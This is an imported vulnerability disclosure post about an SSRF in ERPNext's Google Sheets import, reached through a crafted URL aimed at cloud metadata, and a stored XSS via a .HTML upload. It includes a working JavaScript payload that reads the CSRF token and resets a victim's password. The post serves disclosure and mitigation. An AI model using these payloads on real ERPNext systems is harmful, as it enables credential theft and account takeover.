---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-04-06_ssrf-and-account-takeover-via-xss-in-erpnext-0-day.md
original_filename: 2022-04-06_ssrf-and-account-takeover-via-xss-in-erpnext-0-day.md
title: SSRF and Account Takeover via XSS in ERPNext (0-day)
category: documents
detected_topics:
- ssrf
- xss
- cloud-security
- sso
- access-control
- command-injection
tags:
- imported
- documents
- ssrf
- xss
- cloud-security
- sso
- access-control
- command-injection
language: en
raw_sha256: d5278101ed57965e40716739103c90d94a815c532c27766dcfcd34187e2bac6f
text_sha256: 2e9c57c0170855319452cc67fdcad7d6e706cf3ad48e36e664b13799fee8a1cf
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: true
---

# SSRF and Account Takeover via XSS in ERPNext (0-day)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-04-06_ssrf-and-account-takeover-via-xss-in-erpnext-0-day.md
- Source Type: markdown
- Detected Topics: ssrf, xss, cloud-security, sso, access-control, command-injection
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: True
- Raw SHA256: `d5278101ed57965e40716739103c90d94a815c532c27766dcfcd34187e2bac6f`
- Text SHA256: `2e9c57c0170855319452cc67fdcad7d6e706cf3ad48e36e664b13799fee8a1cf`


## Content

---
title: "SSRF and Account Takeover via XSS in ERPNext (0-day)"
url: "https://tech-blog.cymetrics.io/en/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/"
final_url: "https://tech-blog.cymetrics.io/en/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/"
authors: ["huli (@aszx87410)"]
programs: ["ERPNext"]
bugs: ["SSRF", "XSS", "Account takeover"]
publication_date: "2022-04-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2738
---

[ERPNext](https://erpnext.com/) is a very popular open-source ERP(Enterprise Resource Planning) software built on [Frappe Framework](https://github.com/frappe/frappe).

Last December, we found two vulnerabilities in the latest version of ERPNext: SSRF(Server-Side Request Forgery) and account takeover via XSS. Both vulnerabilities require a low-privileged authenticated user to perform the attack.

By exploiting SSRF, a malicious actor could steal the credentials from cloud metadata and may lead to RCE. For XSS, it's possible to take over others’ accounts.

We reported both vulnerabilities on November 25th, 2021. At the time of writing, there is still no fix for those two issues, so we decided to publish the details to inform the public about the risk.

## # SSRF(Server-Side Request Forgery)

In ERPNext, the user with certain roles can import data from files or Google Sheets:

![](/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-1920w.png)

After data is imported, you can preview the content before saving it to the system.

Following is the function for importing data from Google Sheets:
  
  
  def get_csv_content_from_google_sheets(url):  
  # https://docs.google.com/spreadsheets/d/{sheetid}}/edit#gid={gid}  
  validate_google_sheets_url(url)  
  # get gid, defaults to first sheet  
  if "gid=" in url:  
  gid = url.rsplit('gid=', 1)[1]  
  else:  
  gid = 0  
  # remove /edit path  
  url = url.rsplit('/edit', 1)[0]  
  # add /export path,  
  url = url + '/export?format=csv&gid={0}'.format(gid)  
  
  headers = {  
  'Accept': 'text/csv'  
  }  
  response = requests.get(url, headers=headers)  
  
  if response.ok:  
  # if it returns html, it couldn't find the CSV content  
  # because of invalid url or no access  
  if response.text.strip().endswith('</html>'):  
  frappe.throw(  
  _('Google Sheets URL is invalid or not publicly accessible.'),  
  title=_("Invalid URL")  
  )  
  return response.content  
  elif response.status_code == 400:  
  frappe.throw(_('Google Sheets URL must end with "gid={number}". Copy and paste the URL from the browser address bar and try again.'),  
  title=_("Incorrect URL"))  
  else:  
  response.raise_for_status()

It's straightforward, just get the data from Google Sheets and check the format.

But, what if we provide a URL that looks like Google Sheet URL, but it's not?

The system only checks if the URL contains `docs.google.com/spreadsheets`:
  
  
  def validate_google_sheets_url(url):  
  if "docs.google.com/spreadsheets" not in url:  
  frappe.throw(  
  _('"{0}" is not a valid Google Sheets URL').format(url),  
  title=_("Invalid URL"),  
  )

So, we can provide a URL like this: `http://localhost:8080/#docs.google.com/spreadsheets`, then we can get the response from the internal network. It's a classic SSRF vulnerability.

![](/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-1920w.png)

If the port is open, the response will be different:

![](/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-1920w.png)

Moreover, we can access sensitive information via cloud metadata if the server is hosted on a cloud service.

For example, frappe cloud is hosted on AWS, so we can get metadata in `http://169.254.169.254/latest/dynamic/instance-identity/document#docs.google.com/spreadsheets`:

![](/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-1920w.png)

If there is an IAM associated with the instance, we can also read its credentials and escalate to RCE, here is one example: [Escalating SSRF to RCE](https://sanderwind.medium.com/escalating-ssrf-to-rce-7c0147371c40).

### # Mitigation

Before a new patched version release, we suggest that:

  1. Be careful when you grant importing data permission to a user.
  2. Keep ERPNext in an isolated environment.
  3. Requires [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-options.html) for AWS instance.

## # Account Takeover via XSS

Every user in the ERPNext system has a profile page, like the following:

![](/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-1920w.png)

Users can upload their profile images from devices:

![](/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-1920w.png)

When uploading files, the front-end will check the file name to ensure it's an image(.png, .jpg, and so on). But, the back-end has no such check, so we can upload an HTML file by intercepting the request and changing the file extension to `.html`.

![](/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-1920w.png)

But unfortunately, we can't directly open the HTML file because of the `Content-Disposition` header:

![](/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-1920w.png)

Because of the header, the browser will download the HTML page instead of opening it.

After playing around with the feature for a while, we found that it can be bypassed by using the upper-case extension `.HTML`:

![](/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-1920w.png)

Now, we have an easy XSS. On the [security page](https://erpnext.com/security) of ERPNext, it clearly states that:

> Please Note: XSS and HTML Injections won't be accepted.

I think it's fine for some cases because pop-up an alert makes no harm, right? But what if we find a way to escalate it to another vulnerability with bigger impact?

Surprisingly, in ERPNext, the user doesn't need to input the old password to change to a new password=***REDACTED***

So, we can write a script to automatically update the password for the victim user, like this:
  
  
  <script>  
  async function exploit(){  
  // get user id from cookie  
  const userId = document.cookie.match(/user_id=([^;]+)/)[1]  
  console.log('user id:', userId)  
  
  // get csrf token first  
  const html = await fetch('/app').then(res => res.text())  
  const token = html.match(/csrf_token = "(.+)";/)[1]  
  console.log('csrf token:', token)  
  
  // get user doc  
  const json = await fetch('/api/method/frappe.desk.form.load.getdoc?doctype=User&name='+userId).then(res=>res.json())  
  const docs = json.docs[0]  
  console.log(docs)  
  
  // just random strong password  
  docs.new_password=***REDACTED***  
  
  formBody = 'doc=' + encodeURIComponent(JSON.stringify(docs)) + '&action=Save'  
  
  // update password  
  const resp = await fetch('/api/method/frappe.desk.form.save.savedocs', {  
  method: 'POST',  
  headers: {  
  'X-Frappe-Csrf-Token': token,  
  'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'  
  },  
  body: formBody  
  });  
  const result = await resp.json();  
  console.log(result)  
  }  
  
  exploit()  
  </script>

When the victim user opens this page, their password will be updated.

So, as a malicious actor, I can upload the above content to the server, then send the URL to the admin. After the admin opens the page, I can take over his account because I know his password.

We successfully escalate from XSS to account takeover vulnerability.

### # Mitigation

Before a new patched version release, we suggest that:

  1. Be careful before opening any links hosted on ERPNext server, or using incognito mode to visit the link

## # Conclusion

The latest version of ERPNext is vulnerable to both SSRF and XSS which can lead to account takeover. By exploiting SSRF, a malicious actor may read credentials from cloud metadata and escalate to RCE.

Both vulnerabilities require a low-privileged authenticated user to perform the attack.

There is no patch for the vulnerabilities at the time of writing. So we suggest that the user should be careful before the patch release.

## # Disclosure Timeline

`2021-11-25` Reported vulnerabilities via the [official form](https://erpnext.com/security)  
`2021-12-15` Follow up, they said they are working on the fix  
`2022-01-03` Follow up again, they said it's in the development phase  
`2022-02-14` Follow up again, no response  
`2022-02-23` 90 days since the initial report  
`2022-03-10` Follow up again, no response  
`2022-03-24` Ask for the updates, if there is no response we will publish the details in 14 days, no response  
`2022-04-06` Public disclosure

[![Share](/img/icons/icon_external link hyperlink.svg)Share this post](https://tech-blog.cymetrics.io/en/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/)

Tag

[#postsEn](/en/tags/postsen/) [#Security](/en/tags/security/)

Recommendation

  1. [Unveiling Access Control in Ethereum Smart Contracts: Common Access Control Vulnerabilities](/en/posts/alice/solidity_access_control_en/)
  2. [The Hidden Dangers of CDNs: Why CDNs May Not Be as Secure as You Think](/en/posts/seadog007/dangers-in-cdn/)
  3. [Spring4shell - a new critical RCE vulnerability found in Java Spring Framework](/en/posts/cymetrics/critical-java-0day-spring4shell/)
  4. [Java’s Thread Model and Golang Goroutine](/en/posts/genchilu/javas-thread-model-and-golang-goroutine-en/)
  5. [The Difference Between Java and Golang in Writing Concurrent Code to Access Shared Variable](/en/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-en/)

![huli](/img/authors/huli_logo.jpg)

Author

[huli](/en/posts/huli)

Act as a bridge between Front-end and Security world

Discussion(login required)
